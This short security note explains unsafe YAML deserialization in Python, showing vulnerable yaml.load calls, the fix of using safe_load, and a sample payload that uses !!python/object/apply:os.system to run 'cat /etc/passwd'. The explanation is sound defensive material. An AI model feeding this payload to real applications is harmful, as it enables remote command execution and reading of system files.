# YAML

## Exploitation

The example below is a vulnerable YAML code that can be exploited.

#### Python 2

```text
import yaml

# Input can be whater text or a file with this content
yaml.load(input)
```

#### Python 3

In Python 3, the default loader changed to a safe Loader, and to exploit this vulnerability should be enable UnsafeLoader explicitly. 

```text
import yaml

# Input can be whater text or a file with this content
yaml.load(input, Loader=yaml.UnsafeLoader)
```

Example payload to exploit this vulnerability in a file sample.yaml os a direct input if allowed.

```text
!!python/object/apply:os.system ["cat /etc/passwd"]
```

## Fix

Fixing this vulnerability is relatively easy.

Replace the usage of `yaml.load()` function with `yaml.safe_load()` 

In Python 3, `yaml.load()` uses as default data Loader `FullLoader` which avoids code execution.

